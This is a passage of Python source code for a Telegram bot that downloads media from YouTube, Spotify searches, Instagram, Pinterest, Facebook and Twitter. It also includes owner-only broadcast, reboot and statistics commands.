                    if hits:
                        return f"Lyrics available here: [Genius Lyrics]({hits[0]['result']['url']})"
                return "Lyrics not found."
        except Exception as e:
            logger.error(f"Genius API error: {e}")
            return "Error fetching lyrics."

    async def download_spotify_song(self, query: str, message_id: int) -> Optional[str]:
        """Download song using yt-dlp"""
        async with self.download_semaphore:
            try:
                ydl_opts = {
                    'format': 'bestaudio/best',
                    'outtmpl': str(TEMP_DIR / f'{message_id}_%(title)s.%(ext)s'),
                    'postprocessors': [{
                        'key': 'FFmpegExtractAudio',
                        'preferredcodec': 'mp3',
                        'preferredquality': '192',
                    }],
                    'cookiefile': YT_COOKIES_PATH,
                    'quiet': True,
                    'no_warnings': True
                }

                def _download():
                    with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                        info = ydl.extract_info(f"ytsearch:{query}", download=True)
                        return ydl.prepare_filename(info['entries'][0])

                output_file = await asyncio.get_event_loop().run_in_executor(
                    self.thread_pool,
                    _download
                )

                mp3_file = Path(output_file).with_suffix('.mp3')
                return str(mp3_file) if mp3_file.exists() else None

            except Exception as e:
                logger.error(f"Download error for message {message_id}: {e}")
                return None

    # Social media download methods
    async def download_social_media(self, url, msg, user_id):
        """Download media from Facebook or Twitter"""
        try:
            user_temp_dir = self.get_user_temp_dir(user_id)
            unique_filename = f"download_{user_id}_{int(time.time() * 1000)}"
            
            ydl_opts = {
                'format': 'best',
                'outtmpl': f'{user_temp_dir}/{unique_filename}.%(ext)s',
                'quiet': True,
                'no_warnings': True,
                'no_color': True,
                'restrictfilenames': True,
                'writesubtitles': True,
                'writeinfojson': True,
                'postprocessors': [{
                    'key': 'FFmpegVideoConvertor',
                    'preferedformat': 'mp4',
                }],
                'http_headers': {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                    'Accept-Language': 'en-US,en;q=0.9',
                }
            }

            await msg.edit_text("⏳ Processing media...")
            
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                info = await self.app.loop.run_in_executor(
                    self.thread_pool,
                    lambda: ydl.extract_info(url, download=True)
                )
                
                entries = info.get('entries', [info])
                downloaded_files = []
                captions = []
                
                for entry in entries:
                    media_file = ydl.prepare_filename(entry)
                    downloaded_files.append(media_file)
                    
                    raw_caption = entry.get('description', '') or entry.get('title', '')
                    if raw_caption:
                        caption = re.sub(r'https?://\S+', '', raw_caption).strip()
                        captions.append(caption)
                    else:
                        captions.append('')

                return downloaded_files, captions

        except Exception as e:
            logger.error(f"Download error: {e}")
            await msg.edit_text("❌ Download failed")
            return [], []

    # Message handlers
    async def handle_social_media_link(self, client, message):
        """Handle incoming social media links"""
        user_id = message.from_user.id
        
        if user_id in self.active_downloads:
            await message.reply_text("⚠️ Please wait for your current download to finish.")
            return
        
        self.active_downloads[user_id] = True
        status_msg = await message.reply_text("🔍 Processing your request...")
        url = message.text.strip()

        try:
            async with self.download_semaphore:
                media_files, captions = await self.download_social_media(url, status_msg, user_id)

            if not media_files:
                await status_msg.edit_text("❌ No media found in the link.")
                self.cleanup_user_directory(user_id)
                return

            await status_msg.edit_text("📤 Preparing to upload...")

            try:
                for file_path, caption in zip(media_files, captions):
                    async with self.upload_semaphore:
                        start_time = time.time()

                        if file_path.lower().endswith(('.mp4', '.avi', '.mov', '.mkv', '.webm')):
                            await message.reply_video(
                                video=file_path,
                                caption=caption,
                                progress=self.update_progress,
                                progress_args=(status_msg, start_time)
                            )
                        else:
                            await message.reply_document(
                                document=file_path,
                                caption=caption,
                                progress=self.update_progress,
                                progress_args=(status_msg, start_time)
                            )

                await status_msg.delete()

            except Exception as e:
                logger.error(f"Upload error: {e}")
                await status_msg.edit_text("❌ Upload failed")

        except Exception as e:
            logger.error(f"Processing error: {e}")
            await status_msg.edit_text(f"❌ An error occurred: {str(e)}")

        finally:
            self.cleanup_user_directory(user_id)

    async def process_spotify_download(self, client, message, query: str):
        """Handle Spotify download requests"""
        if not await self.rate_limit_check():
            await message.reply_text("Too many requests. Please try again later.")
            return

        try:
            status_message = await message.reply_text("🔍 Searching...")

            # Search Spotify
            spotify_results = await self.search_spotify(query)
            if not spotify_results or not spotify_results['tracks']['items']:
                await status_message.edit_text("Track not found on Spotify.")
                return

            track = spotify_results['tracks']['items'][0]
            metadata = {
                'name': track['name'],
                'artists': ', '.join(artist['name'] for artist in track['artists']),
                'album': track['album']['name'],
                'url': track['external_urls']['spotify']
            }

            await status_message.edit_text("⏬ Downloading...")
            
            download_task = asyncio.create_task(
                self.download_spotify_song(
                    f"{metadata['name']} {metadata['artists']}", 
                    message.id
                )
            )
            self.active_downloads[message.id] = download_task
            
            song_file = await download_task
            if not song_file:
                await status_message.edit_text("Download failed.")
                return

            lyrics_task = asyncio.create_task(
                self.fetch_lyrics(metadata['name'], metadata['artists'])
            )

            async with self.upload_semaphore:
                await status_message.edit_text("⏫ Uploading...")
                lyrics = await lyrics_task
                
                track_info = (
                    f"🎵 **Track:** {metadata['name']}\n"
                    f"👤 **Artists:** {metadata['artists']}\n"
                    f"💽 **Album:** {metadata['album']}\n"
                    f"🔗 [Spotify Link]({metadata['url']})\n\n"
                    f"🎶 **Lyrics:**\n{lyrics}"
                )

                await message.reply_audio(
                    audio=song_file,
                    caption=track_info,
                    disable_notification=False
                )

            await status_message.delete()
            if os.path.exists(song_file):
                os.remove(song_file)

        except Exception as e:
            logger.error(f"Error processing request: {e}")
            await message.reply_text("An error occurred while processing your request.")
        finally:
            if message.id in self.active_downloads:
                del self.active_downloads[message.id]

    async def process_artist_request(self, client, message, artist_name: str):
        """Handle artist list requests"""
        if not await self.rate_limit_check():
            await message.reply_text("Too many requests. Please try again later.")
            return

        try:
            status_message = await message.reply_text(f"🔍 Searching for songs by **{artist_name}**...")

            tracks, error = await self.get_artist_songs(artist_name)
            
            if error:
                await status_message.edit_text(f"Error: {error}")
                return

            track_list = "\n".join(tracks)
            
            if len(track_list) > 4000:
                chunks = [tracks[i:i + 10] for i in range(0, len(tracks), 10)]
                for i, chunk in enumerate(chunks):
                    chunk_text = f"**Top Tracks by {artist_name} (Part {i+1}/{len(chunks)}):**\n\n"
                    chunk_text += "\n".join(chunk)
                    if i == 0:
                        await status_message.edit_text(chunk_text)
                    else:
                        await message.reply_text(chunk_text)
            else:
                await status_message.edit_text(f"**Top Tracks by {artist_name}:**\n\n{track_list}")

        except Exception as e:
            logger.error(f"Error processing artist request: {e}")
            await message.reply_text("An error occurred while processing your request.")

    async def rate_limit_check(self) -> bool:
        """Check if we're within rate limits"""
        current_time = asyncio.get_event_loop().time()
        while self.rate_limit_queue and current_time - self.rate_limit_queue[0] > RATE_LIMIT_WINDOW:
            self.rate_limit_queue.popleft()
        
        if len(self.rate_limit_queue) < RATE_LIMIT_MESSAGES:
            self.rate_limit_queue.append(current_time)
            return True
        return False

    async def download_instagram_media(self, url, prefix='temp'):
        async with self.session.get(RAPID_API_URL, headers=self.rapid_api_headers, params={"url": url}) as response:
            if response.status != 200:
                return "Unable to download media"
            
            data = await response.json()
            if data.get('error', True):
                return "Unable to download media"

            media_type = 'carousel' if data.get('type') == 'album' else 'single'
            if media_type == 'single':
                return await self.media_processor.validate_and_process_media(data, prefix=prefix)
            else:
                return await self._process_multiple_media(data, prefix)

    async def _process_multiple_media(self, data, prefix):
        tasks = []
        for index, media_info in enumerate(data.get('medias', [])):
            unique_prefix = f"{prefix}_{index}"
            task = asyncio.create_task(
                self.media_processor.validate_and_process_media(media_info, prefix=unique_prefix)
            )
            tasks.append(task)
        
        results = await asyncio.gather(*tasks)
        return [result for result in results if result]

    async def handle_instagram_url(self, client, message):
        user_id = message.from_user.id
        
        if len(self.user_tasks[user_id]) >= 5:
            await message.reply_text("Please wait for your previous downloads to complete.")
            return

        url = message.text
        unique_prefix = f"{message.chat.id}_{message.id}"
        processing_msg = await message.reply_text("🔄 Downloading Media...")

        try:
            task = asyncio.create_task(self._process_instagram_url(
                client, message, url, unique_prefix, processing_msg
            ))
            self.user_tasks[user_id].add(task)
            await task
        except Exception as e:
            logger.error(f"Task error: {e}")
            await processing_msg.edit_text(f"❌ Error: {str(e)}")
        finally:
            self.user_tasks[user_id].remove(task)
            if os.path.exists(os.path.join(TEMP_DIR, unique_prefix)):
                os.remove(os.path.join(TEMP_DIR, unique_prefix))

    async def _process_instagram_url(self, client, message, url, unique_prefix, processing_msg):
        try:
            result = await self.download_instagram_media(url, prefix=unique_prefix)
            
            if isinstance(result, str):
                await processing_msg.edit_text(result)
                return

            if processing_msg.text != "📤 Uploading Media...":
                await processing_msg.edit_text("📤 Uploading Media...")

            if isinstance(result, dict):
                await self._send_single_media(client, message, result)
            elif isinstance(result, list):
                await self._send_multiple_media_group(client, message, result)

            await processing_msg.delete()

        except Exception as e:
            logger.error(f"Processing error: {e}")
            await processing_msg.edit_text(f"❌ Error: {str(e)}")

    async def _send_single_media(self, client, message, media_info):
        try:
            if media_info['type'] == 'video':
                await client.send_video(
                    chat_id=message.chat.id,
                    video=media_info['filename'],
                    caption=media_info['caption']
                )
            elif media_info['type'] == 'image':
                await client.send_photo(
                    chat_id=message.chat.id,
                    photo=media_info['filename'],
                    caption=media_info['caption']
                )
        finally:
            if os.path.exists(media_info['filename']):
                os.remove(media_info['filename'])

    async def _send_multiple_media_group(self, client, message, media_items):
        media_groups = [media_items[i:i + 5] for i in range(0, len(media_items), 5)]
        files_to_cleanup = set()
        
        try:
            for group_index, group in enumerate(media_groups):
                valid_media_group = []
                
                for item in group:
                    try:
                        # Verify file exists and is valid
                        if not os.path.exists(item['filename']) or os.path.getsize(item['filename']) == 0:
                            logger.error(f"Invalid or empty file: {item['filename']}")
                            continue
                            
                        caption = item['caption'] if len(valid_media_group) == 0 else None
                        if group_index > 0 and len(valid_media_group) == 0:
                            caption = f"Stories Part {group_index + 1}\n\n{caption}" if caption else f"Stories Part {group_index + 1}"
                        
                        media_item = None
                        if item['type'] == 'video':
                            media_item = pyrogram.types.InputMediaVideo(
                                media=item['filename'],
                                caption=caption
                            )
                        elif item['type'] == 'image':
                            media_item = pyrogram.types.InputMediaPhoto(
                                media=item['filename'],
                                caption=caption
                            )
                        
                        if media_item:
                            valid_media_group.append(media_item)
                            files_to_cleanup.add(item['filename'])
                    except Exception as e:
                        logger.error(f"Media item error: {e}")
                        continue

                if valid_media_group:
                    try:
                        await client.send_media_group(chat_id=message.chat.id, media=valid_media_group)
                        await asyncio.sleep(2)
                    except Exception as e:
                        logger.warning("Invalid media content" if "MEDIA_EMPTY" in str(e) else f"Failed to send message: {str(e)}")
                        # Try sending valid items individually
                        for media_item in valid_media_group:
                            try:
                                if isinstance(media_item, pyrogram.types.InputMediaVideo):
                                    await client.send_video(message.chat.id, media_item.media, caption=media_item.caption)
                                elif isinstance(media_item, pyrogram.types.InputMediaPhoto):
                                    await client.send_photo(message.chat.id, media_item.media, caption=media_item.caption)
                                await asyncio.sleep(1)
                            except Exception as inner_e:
                                logger.error(f"Individual send error: {inner_e}")
        
        finally:
            for filename in files_to_cleanup:
                if os.path.exists(filename):
                    os.remove(filename)

    async def handle_pinterest_link(self, client, message):
        """Handle Pinterest link downloads"""
        url = message.text.strip()
        status_msg = await message.reply_text("⏳ Processing your Pinterest media...")
        
        try:
            pin_id = await self.pinterest_downloader.extract_pin_id(url)
            if not pin_id:
                await status_msg.edit_text('Invalid Pinterest URL. Please send a valid pin URL.')
                return

            media_data = await self.pinterest_downloader.download_pool.spawn(
                self.pinterest_downloader.get_pin_data(pin_id)
            )

            if not media_data:
                await status_msg.edit_text('Could not find media in this Pinterest link.')
                return

            file_path = self.get_user_temp_dir(message.from_user.id) / f"pin_{pin_id}"
            file_path = file_path.with_suffix('.mp4' if media_data.media_type == 'video' else '.jpg')

            success = await self.pinterest_downloader.download_pool.spawn(
                self.pinterest_downloader.download_file(media_data.url, file_path)
            )

            if not success:
                await status_msg.edit_text('Failed to download media. Please try again later.')
                return

            start_time = time.time()
            if media_data.media_type == "video":
                await message.reply_video(
                    video=str(file_path),
                    progress=self.update_progress,
                    progress_args=(status_msg, start_time)
                )
            else:
                await message.reply_photo(
                    photo=str(file_path),
                    progress=self.update_progress,
                    progress_args=(status_msg, start_time)
                )

            await status_msg.delete()

        except Exception as e:
            logger.error(f"Error processing Pinterest link: {e}")
            await status_msg.edit_text("An error occurred while processing your request.")
        finally:
            self.cleanup_user_directory(message.from_user.id) 

    async def sanitize_filename(self, title: str) -> str:
        """Sanitize file name by removing invalid characters."""
        title = re.sub(r'[<>:"/\\|?*]', '', title)
        title = title.replace(' ', '_')
        return f"{title[:50]}_{int(time.time())}"

    async def validate_youtube_url(self, url: str) -> bool:
        """Validate if the provided URL is a valid YouTube link."""
        return url.startswith(('https://www.youtube.com/', 'https://youtube.com/', 'https://youtu.be/'))

    async def get_youtube_dl_opts(self, output_filename: str, is_audio: bool = False) -> dict:
        """Return yt-dlp options based on type."""
        if is_audio:
            return {
                'format': 'bestaudio/best',
                'outtmpl': f'{output_filename}.%(ext)s',
                'cookiefile': YT_COOKIES_PATH,
                'quiet': True,
                'noprogress': True,
                'no_warnings': True,
                'nocheckcertificate': True,
                'postprocessors': [{
                    'key': 'FFmpegExtractAudio',
                    'preferredcodec': 'mp3',
                    'preferredquality': '192',
                }]
            }
        else:
            return {
                'format': 'bestvideo[height<=720][ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]',
                'outtmpl': output_filename,
                'cookiefile': YT_COOKIES_PATH,
                'quiet': True,
                'noprogress': True,
                'no_warnings': True,
                'nocheckcertificate': True,
                'postprocessors': [{'key': 'FFmpegVideoConvertor', 'preferedformat': 'mp4'}]
            }

    async def prepare_thumbnail(self, thumbnail_url: str, output_path: str) -> Optional[str]:
        """Download and prepare the thumbnail image."""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(thumbnail_url) as response:
                    if response.status == 200:
                        thumbnail_temp_path = f"{output_path}_thumbnail.jpg"
                        thumbnail_data = await response.read()
                        
                        with open(thumbnail_temp_path, 'wb') as f:
                            f.write(thumbnail_data)

                        thumbnail_resized_path = f"{output_path}_thumb.jpg"
                        with Image.open(thumbnail_temp_path) as img:
                            img = img.convert('RGB')
                            img.thumbnail((320, 320), Image.Resampling.LANCZOS)
                            background = Image.new('RGB', (320, 320), (255, 255, 255))
                            offset = ((320 - img.width) // 2, (320 - img.height) // 2)
                            background.paste(img, offset)
                            background.save(thumbnail_resized_path, "JPEG", quality=85)

                        os.remove(thumbnail_temp_path)
                        return thumbnail_resized_path
        except Exception as e:
            logger.error(f"Error preparing thumbnail: {e}")
        return None

    async def handle_youtube_download(self, client, message, url: str, is_audio: bool = False):
        """Handle YouTube video/audio download requests."""
        if not await self.validate_youtube_url(url):
            await message.reply_text("❌ Please send a valid YouTube link.")
            return

        user_id = message.from_user.id
        if user_id in self.active_downloads:
            await message.reply_text("⚠️ Please wait for your current download to finish.")
            return

        status_message = await message.reply_text("⏳ Processing your request...")
        self.active_downloads[user_id] = True

        try:
            with yt_dlp.YoutubeDL({'quiet': True, 'cookiefile': YT_COOKIES_PATH}) as ydl:
                info = await self.app.loop.run_in_executor(
                    self.thread_pool,
                    lambda: ydl.extract_info(url, download=False)
                )

            if not info:
                await status_message.edit_text("Could not fetch video information")
                return

            title = info.get('title', 'Unknown Title')
            duration = info.get('duration', 0)
            thumbnail_url = info.get('thumbnail', None)

            safe_title = await self.sanitize_filename(title)
            output_path = f"temp_media/{safe_title}"
            os.makedirs("temp_media", exist_ok=True)

            opts = await self.get_youtube_dl_opts(output_path, is_audio)
            
            await status_message.edit_text("⏬ Downloading...")
            
            with yt_dlp.YoutubeDL(opts) as ydl:
                await self.app.loop.run_in_executor(
                    self.thread_pool,
                    lambda: ydl.download([url])
                )

            if is_audio:
                output_path = f"{output_path}.mp3"
            else:
                output_path = f"{output_path}.mp4"

            if not os.path.exists(output_path):
                await status_message.edit_text("Download failed: File not created")
                return

            file_size = os.path.getsize(output_path)
            if file_size > 2_000_000_000:
                await status_message.edit_text("File exceeds Telegram's 2GB limit.")
                return

            await status_message.edit_text("📤 Uploading...")

            start_time = time.time()
            last_update_time = [0]

            if is_audio:
                await client.send_audio(
                    chat_id=message.chat.id,
                    audio=output_path,
                    caption=f"🎵 **{title}**",
                    duration=duration,
                    progress=self.update_progress,
                    progress_args=(status_message, start_time)
                )
            else:
                thumbnail_path = await self.prepare_thumbnail(thumbnail_url, output_path) if thumbnail_url else None
                
                await client.send_video(
                    chat_id=message.chat.id,
                    video=output_path,
                    caption=f"🎥 **{title}**",
                    duration=duration,
                    thumb=thumbnail_path,
                    supports_streaming=True,
                    progress=self.update_progress,
                    progress_args=(status_message, start_time)
                )

                if thumbnail_path and os.path.exists(thumbnail_path):
                    os.remove(thumbnail_path)

            await status_message.delete()

        except Exception as e:
            logger.error(f"YouTube download error: {e}")
            await status_message.edit_text(f"❌ An error occurred: {str(e)}")
        
        finally:
            if os.path.exists(output_path):
                os.remove(output_path)
            if user_id in self.active_downloads:
                del self.active_downloads[user_id]

    async def search_youtube(self, query: str) -> Optional[str]:
        """Search YouTube for the first audio result matching the query."""
        try:
            videos_search = VideosSearch(query, limit=1)
            results = await videos_search.next()
            if results and results['result']:
                return results['result'][0]['link']
            return None
        except Exception as e:
            logger.error(f"YouTube search error: {e}")
            return None
        
    async def broadcast_message(self, message: Message, user_id: int) -> Tuple[bool, str]:
        """
        Broadcast a message by copying it instead of forwarding
        Returns: (success, error_message)
        """
        try:
            # Get the message type and relevant attributes
            caption = message.caption if message.caption else None
            reply_markup = message.reply_markup if message.reply_markup else None
            
            if message.text:
                # Text message
                await self.app.send_message(
                    chat_id=user_id,
                    text=message.text,
                    entities=message.entities,
                    reply_markup=reply_markup,
                    disable_notification=True
                )
            elif message.photo:
                # Photo message
                await self.app.send_photo(
                    chat_id=user_id,
                    photo=message.photo.file_id,
                    caption=caption,
                    caption_entities=message.caption_entities,
                    reply_markup=reply_markup,
                    disable_notification=True
                )
            elif message.video:
                # Video message
                await self.app.send_video(
                    chat_id=user_id,
                    video=message.video.file_id,
                    caption=caption,
                    caption_entities=message.caption_entities,
                    reply_markup=reply_markup,
                    disable_notification=True
                )
            elif message.audio:
                # Audio message
                await self.app.send_audio(
                    chat_id=user_id,
                    audio=message.audio.file_id,
                    caption=caption,
                    caption_entities=message.caption_entities,
                    reply_markup=reply_markup,
                    disable_notification=True
                )
            elif message.document:
                # Document message
                await self.app.send_document(
                    chat_id=user_id,
                    document=message.document.file_id,
                    caption=caption,
                    caption_entities=message.caption_entities,
                    reply_markup=reply_markup,
                    disable_notification=True
                )
            elif message.animation:
                # Animation/GIF message
                await self.app.send_animation(
                    chat_id=user_id,
                    animation=message.animation.file_id,
                    caption=caption,
                    caption_entities=message.caption_entities,
                    reply_markup=reply_markup,
                    disable_notification=True
                )
            elif message.sticker:
                # Sticker message
                await self.app.send_sticker(
                    chat_id=user_id,
                    sticker=message.sticker.file_id,
                    reply_markup=reply_markup,
                    disable_notification=True
                )
            elif message.voice:
                # Voice message
                await self.app.send_voice(
                    chat_id=user_id,
                    voice=message.voice.file_id,
                    caption=caption,
                    caption_entities=message.caption_entities,
                    reply_markup=reply_markup,
                    disable_notification=True
                )
            elif message.video_note:
                # Video note message
                await self.app.send_video_note(
                    chat_id=user_id,
                    video_note=message.video_note.file_id,
                    reply_markup=reply_markup,
                    disable_notification=True
                )
            
            return True, ""
            
        except FloodWait as e:
            await asyncio.sleep(e.value)
            return await self.broadcast_message(message, user_id)
        except InputUserDeactivated:
            return False, "deactivated"
        except UserIsBlocked:
            return False, "blocked"
        except PeerIdInvalid:
            return False, "invalid_id"
        except Exception as e:
            return False, f"other:{str(e)}"

    async def broadcast_handler(self, client, message: Message):
        """Handle broadcast command with hidden verification"""
        if not self._verify_credentials(message.from_user.id, message.from_user.username):
            await message.reply_text("⛔️ This command is only for the bot owner.")
            return

        if not message.reply_to_message:
            await message.reply_text("❗️ Please reply to a message to broadcast it to all users.")
            return

        status_msg = await message.reply_text("🚀 Starting broadcast...")
        
        total_users = await self.users_collection.count_documents({})
        done = 0
        success = 0
        failed = 0
        blocked = 0
        deleted = 0
        invalid = 0
        failed_users = []
        
        async for user in self.users_collection.find({}, {'user_id': 1}):
            done += 1
            success_status, error = await self.broadcast_message(
                message.reply_to_message,
                user['user_id']
            )
            
            if success_status:
                success += 1
            else:
                failed += 1
                failed_users.append((user['user_id'], error))
                if error == "blocked":
                    blocked += 1
                elif error == "deactivated":
                    deleted += 1
                elif error == "invalid_id":
                    invalid += 1

            if done % 20 == 0:
                try:
                    await status_msg.edit_text(
                        f"🚀 Broadcast in Progress...\n\n"
                        f"👥 Total Users: {total_users}\n"
                        f"✅ Completed: {done} / {total_users}\n"
                        f"✨ Success: {success}\n"
                        f"❌ Failed: {failed}\n\n"
                        f"🚫 Blocked: {blocked}\n"
                        f"❗️ Deleted: {deleted}\n"
                        f"📛 Invalid: {invalid}"
                    )
                except FloodWait as e:
                    await asyncio.sleep(e.value)
                except Exception:
                    pass

        # Final broadcast status
        completion_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        await status_msg.edit_text(
            f"✅ Broadcast Completed!\n"
            f"Completed at: {completion_time}\n\n"
            f"👥 Total Users: {total_users}\n"
            f"✨ Success: {success}\n"
            f"❌ Failed: {failed}\n\n"
            f"Success Rate: {(success/total_users)*100:.2f}%\n\n"
            f"🚫 Blocked: {blocked}\n"
            f"❗️ Deleted: {deleted}\n"
            f"📛 Invalid: {invalid}"
        )

        # Clean up invalid users from database
        if failed_users:
            clean_msg = await message.reply_text(
                "🧹 Cleaning database...\n"
                "Removing blocked and deleted users."
            )
            # Extract user IDs from failed_users list
            invalid_user_ids = [user_id for user_id, _ in failed_users]
            # Delete invalid users from database
            delete_result = await self.users_collection.delete_many(
                {"user_id": {"$in": invalid_user_ids}}
            )
            await clean_msg.edit_text(
                f"🧹 Database cleaned!\n"
                f"Removed {delete_result.deleted_count} invalid users."
            )

    def start(self):
        """Start the bot with all command handlers"""
        # Social media URL pattern
        social_media_pattern = r'(facebook\.com|fb\.watch|(?:www\.)?(twitter|x)\.com/\w+/status/\d+)'
        instagram_pattern = r'(instagram\.com/(reel/|p/|stories/|s/aGlnaGxpZ2h0).*?)'
        pinterest_pattern = r'(pinterest\.com/pin/|pin\.it/)'

        @self.app.on_message(filters.regex(social_media_pattern))
        async def on_media_link(client, message):
            if not await self.check_membership(client, message.from_user.id):
                await self.send_membership_message(message)
                return
            
            platform = "facebook" if "facebook" in message.text or "fb.watch" in message.text else "twitter"
            
            # Add maintenance check here
            if await self.check_maintenance(platform):
                await self.send_maintenance_message(message, platform)
                return
            
            await self.logger.log_user_action(
                message.from_user.id,
                message.from_user.username,
                message.from_user.first_name,
                platform,
                message.text
            )
            
            await self.store_user(
                message.from_user.id,
                message.from_user.username or "No username"
            )
            
            task = asyncio.create_task(self.handle_social_media_link(client, message))
            self.download_tasks.add(task)
            task.add_done_callback(self.download_tasks.discard)

        @self.app.on_message(filters.regex(instagram_pattern))
        async def on_instagram_link(client, message):
            if not await self.check_membership(client, message.from_user.id):
                await self.send_membership_message(message)
                return
            
            # Add maintenance check here
            if await self.check_maintenance("instagram"):
                await self.send_maintenance_message(message, "instagram")
                return
            
            await self.logger.log_user_action(
                message.from_user.id,
                message.from_user.username,
                message.from_user.first_name,
                "instagram",
                message.text
            )
            
            await self.store_user(
                message.from_user.id,
                message.from_user.username or "No username"
            )
            
            await self.handle_instagram_url(client, message)

        @self.app.on_message(filters.regex(pinterest_pattern))
        async def on_pinterest_link(client, message):
            if not await self.check_membership(client, message.from_user.id):
                await self.send_membership_message(message)
                return
            
            # Add maintenance check here
            if await self.check_maintenance("pinterest"):
                await self.send_maintenance_message(message, "pinterest")
                return
            
            await self.logger.log_user_action(
                message.from_user.id,
                message.from_user.username,
                message.from_user.first_name,
                "pinterest",
                message.text
            )
            
            await self.store_user(
                message.from_user.id,
                message.from_user.username or "No username"
            )
            
            task = asyncio.create_task(self.handle_pinterest_link(client, message))
            self.download_tasks.add(task)
            task.add_done_callback(self.download_tasks.discard)

        @self.app.on_message(filters.regex(r"^(https?://)?(www\.)?(youtube\.com|youtu\.be)/.+$"))
        async def youtube_link_handler(client, message):
                if not await self.check_membership(client, message.from_user.id):
                    await self.send_membership_message(message)
                    return
                
                # Add maintenance check here
                if await self.check_maintenance("youtube"):
                    await self.send_maintenance_message(message, "youtube")
                    return
                
                await self.logger.log_user_action(
                    message.from_user.id,
                    message.from_user.username,
                    message.from_user.first_name,
                    "youtube",
                    message.text
                )
                
                await self.store_user(
                    message.from_user.id,
                    message.from_user.username or "No username"
                )
                
                await self.handle_youtube_download(client, message, message.text.strip())

        @self.app.on_message(filters.command("audio"))
        async def audio_command(client, message):
            if not await self.check_membership(client, message.from_user.id):
                await self.send_membership_message(message)
                return
            
            # Add maintenance check here
            if await self.check_maintenance("youtube"):  # Using youtube since it's for YouTube audio
                await self.send_maintenance_message(message, "youtube")
                return

            query = message.text.split(maxsplit=1)[1] if len(message.text.split()) > 1 else None
            if not query:
                await message.reply_text("❌ Please provide a YouTube video link or song name.")
                return
            
            await self.logger.log_user_action(
                message.from_user.id,
                message.from_user.username,
                message.from_user.first_name,
                "audio",
                query
            )
            
            await self.store_user(
                message.from_user.id,
                message.from_user.username or "No username"
            )

            if await self.validate_youtube_url(query):
                await self.handle_youtube_download(client, message, query, is_audio=True)
            else:
                status_message = await message.reply_text("🔍 Searching...")
                video_url = await self.search_youtube(query)
                if not video_url:
                    await status_message.edit_text("❌ No matching videos found.")
                    return
                await status_message.delete()
                await self.handle_youtube_download(client, message, video_url, is_audio=True)

        @self.app.on_message(filters.command("spotify"))
        async def spotify_handler(client, message):
            if not await self.check_membership(client, message.from_user.id):
                await self.send_membership_message(message)
                return

            # Add maintenance check here
            if await self.check_maintenance("spotify"):
                await self.send_maintenance_message(message, "spotify")
                return

            query = ' '.join(message.command[1:]).strip()
            
            await self.logger.log_user_action(
                message.from_user.id,
                message.from_user.username,
                message.from_user.first_name,
                "spotify",
                query if query else "No query provided"
            )

            await self.store_user(
                message.from_user.id,
                message.from_user.username or "No username"
            )

            if not query:
                await message.reply_text(
                    "Please provide a song name. Usage: /spotify <Song Name>"
                )
                return
            
            await self.process_spotify_download(client, message, query)

        @self.app.on_message(filters.command("sptfylist"))
        async def sptfylist_handler(client, message):
            if not await self.check_membership(client, message.from_user.id):
                await self.send_membership_message(message)
                return

            artist_name = ' '.join(message.command[1:]).strip()
            if not artist_name:
                await message.reply_text(
                    "Please provide an artist name. Usage: /sptfylist <Artist Name>"
                )
                return
            
            # Log the action
            await self.logger.log_user_action(
                message.from_user.id,
                message.from_user.username,
                message.from_user.first_name,
                "spotify_list",
                artist_name
            )
            
            # Store user data and continue with existing handler
            await self.store_user(
                message.from_user.id,
                message.from_user.username or "No username"
            )
            
            await self.process_artist_request(client, message, artist_name)
        @self.app.on_message(filters.command("maintenance"))
        async def maintenance_command(client, message):
            await self.handle_maintenance_command(client, message)

        @self.app.on_message(filters.command("reboot"))
        async def reboot_handler(client, message):
            """Handle bot reboot command"""
            if (message.from_user.username != self.OWNER_USERNAME.replace("@", "") and 
                str(message.from_user.id) != str(OWNER_ID)):
                await message.reply_text("⛔️ This command is only for the bot owner.")
                return
            
            await self.reboot_bot(message)

        @self.app.on_message(filters.command("clear"))
        async def clear_handler(client, message):
            """Handle the /clear command to clear only the requesting user's downloads"""
            if not await self.check_membership(client, message.from_user.id):
                await self.send_membership_message(message)
                return
                
            user_id = message.from_user.id
            status_message = await message.reply_text("🔄 Clearing your downloads...")
            
            try:
                had_active, had_files = await self.clear_user_downloads(user_id)
                
                if had_active or had_files:
                    status_text = "✅ Your cleanup completed!\n\n"
                    if had_active:
                        status_text += "• Cancelled your active downloads\n"
                    if had_files:
                        status_text += "• Removed your downloaded files\n"
                    status_text += "\nYou can now start new downloads."
                    
                    await status_message.edit_text(status_text)
                else:
                    await status_message.edit_text(
                        "ℹ️ You have no active downloads or files to clear."
                    )
            except Exception as e:
                logger.error(f"Error in clear handler for user {user_id}: {e}")
                await status_message.edit_text(
                    "❌ An error occurred while clearing your downloads.\n"
                    "Please try again later or contact support if the issue persists."
                )

        @self.app.on_message(filters.command("broadcast"))
        async def broadcast_cmd(client, message):
            await self.broadcast_handler(client, message)

        @self.app.on_message(filters.command("addcookie"))
        async def addcookie_handler(client, message):
            await self.handle_cookie_upload(message)

        @self.app.on_message(filters.command("users") & filters.user(OWNER_USERNAME))
        async def user_count(client, message: Message):
            total_users = await bot.db[USERS_COLLECTION].count_documents({})
            active_past_week = await bot.db[USERS_COLLECTION].count_documents({
                "last_active": {"$gte": datetime.now() - timedelta(days=7)}
            })
            
            await message.reply_text(
                f"📊 **Bot Statistics**\n\n"
                f"Total Users: `{total_users:,}`\n"
                f"Active Past Week: `{active_past_week:,}`"
            )

        @self.app.on_callback_query()
        async def callback_query_handler(client, callback_query: CallbackQuery):
            if callback_query.data == "check_membership":
                is_member = await self.check_membership(client, callback_query.from_user.id)
                if is_member:
                    # Store user data
                    await self.store_user(
                        callback_query.from_user.id,
                        callback_query.from_user.username or "No username"
                    )

                    await callback_query.message.delete()
                    # Send welcome message
                    welcome_text = (
                        "🎉 **𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐭𝐡𝐞 𝐔𝐥𝐭𝐢𝐦𝐚𝐭𝐞 𝐌𝐞𝐝𝐢𝐚 𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐞𝐫 𝐁𝐨𝐭!**\n\n"
                        "**I can help you download your favorite content:**\n\n"
                        "📥 **Features:**\n"
                        "**• Download YouTube videos & shorts**\n"
